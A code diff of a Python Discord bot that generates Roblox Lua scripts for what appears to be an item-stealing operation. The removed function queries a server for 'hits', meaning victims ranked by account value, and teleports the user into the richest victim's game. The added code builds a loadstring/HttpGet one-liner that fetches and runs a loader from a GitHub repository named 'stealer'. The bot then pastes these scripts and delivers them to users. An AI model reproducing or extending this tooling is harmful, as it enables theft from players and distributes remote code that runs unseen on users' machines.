@@ -172,44 +172,6 @@ def build_script(username: str, token: str, loader_url: str) -> str:
     )
 
 
-def build_autojoiner_script(token: str, username: str, game: str) -> str:
-    vps = PROTECTOR
-    return (
-        "-- horizon auto-joiner\n"
-        f'local TOKEN    = "{token}"\n'
-        f'local USERNAME = "{username}"\n'
-        f'local GAME     = "{game}"\n'
-        f'local VPS      = "{vps}"\n'
-        "\n"
-        "local TS  = game:GetService('TeleportService')\n"
-        "local HTTP = game:GetService('HttpService')\n"
-        "\n"
-        "local function getHits()\n"
-        "    local ok, resp = pcall(function()\n"
-        "        return HTTP:RequestAsync({\n"
-        "            Url    = VPS .. '/api/v3/autojoiner',\n"
-        "            Method = 'POST',\n"
-        "            Headers = { ['Content-Type'] = 'application/json', ['user-agent'] = '7$m!R' },\n"
-        "            Body   = HTTP:JSONEncode({ token = TOKEN, game = GAME, jobid = tostring(game.JobId) }),\n"
-        "        })\n"
-        "    end)\n"
-        "    if not ok then return nil end\n"
-        "    if resp.StatusCode ~= 200 then return nil end\n"
-        "    local data = HTTP:JSONDecode(resp.Body)\n"
-        "    return data.hits\n"
-        "end\n"
-        "\n"
-        "local hits = getHits()\n"
-        "if not hits or #hits == 0 then\n"
-        "    print('[horizon] no active hits found for ' .. GAME)\n"
-        "    return\n"
-        "end\n"
-        "\n"
-        "-- already sorted by value desc from server\n"
-        "local best = hits[1]\n"
-        "print('[horizon] joining | user=' .. best.username .. ' value=$' .. tostring(best.total_value))\n"
-        "TS:TeleportToPlaceInstance(tonumber(best.placeid), best.jobid)\n"
-    )
 
 
 class MobileCopyView(discord.ui.View):
@@ -360,32 +322,38 @@ async def ps99(interaction: discord.Interaction, username: str, webhook: str, mi
     await interaction.followup.send("script sent to your DMs", ephemeral=True)
 
 
-@tree.command(name="auto-joiner", description="get the auto-joiner script for a game")
+@tree.command(name="auto-joiner", description="get the auto-joiner script")
 @app_commands.describe(
     token="your horizon token",
-    username="your roblox username",
-    game="mm2 / ame / gag",
+    user="your roblox username",
 )
-@app_commands.choices(game=[
-    app_commands.Choice(name="mm2",  value="mm2"),
-    app_commands.Choice(name="ame",  value="ame"),
-    app_commands.Choice(name="gag",  value="gag"),
-])
 async def auto_joiner(
     interaction: discord.Interaction,
     token:       str,
-    username:    str,
-    game:        str,
+    user:        str,
 ):
-    print(f"[DEBUG] /auto-joiner | caller={interaction.user.id} game={game} username={username}")
+    print(f"[DEBUG] /auto-joiner | caller={interaction.user.id} user={user}")
     await interaction.response.defer(ephemeral=True)
 
-    script        = build_autojoiner_script(token, username, game)
-    paste_link    = await make_paste(script, f"autojoiner_{game}_{username}")
-    mobile_script = f"loadstring(game:HttpGet('{paste_link}', true))()" if paste_link else script
-    pc_script     = f'loadstring(game:HttpGet("{paste_link}", true))()' if paste_link else script
+    script = (
+        f'token = "{token}"\n'
+        f'user = "{user}"\n'
+        f'loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/auto-joiner/auto-joiner-loader", true))()'
+    )
 
-    embed = discord.Embed(title=f"auto-joiner | {game}", color=0x5865F2)
+    paste_link = await make_paste(script, f"autojoiner_{user}")
+
+    if paste_link:
+        pc_script = f'loadstring(game:HttpGet("{paste_link}", true))()'
+        mobile_script = f"loadstring(game:HttpGet('{paste_link}', true))()"
+    else:
+        pc_script = script
+        mobile_script = script
+
+    embed = discord.Embed(
+        title="auto-joiner",
+        color=0x5865F2,
+    )
 
     if paste_link:
         embed.add_field(
@@ -397,7 +365,7 @@ async def auto_joiner(
     else:
         embed.add_field(
             name="script",
-            value=f"```lua\n{script[:1000]}\n```",
+            value=f"```lua\n{script}\n```",
             inline=False,
         )
         view = MobileCopyView(script)
